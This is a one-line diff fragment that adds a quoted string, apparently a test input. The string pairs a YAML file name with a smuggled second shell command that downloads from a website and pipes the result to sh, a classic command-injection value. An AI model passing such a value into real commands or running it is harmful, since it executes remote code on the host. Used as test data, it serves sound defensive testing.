@@ -1,0 +1,1 @@
+"foo.yaml; curl bbc.co.uk | sh"
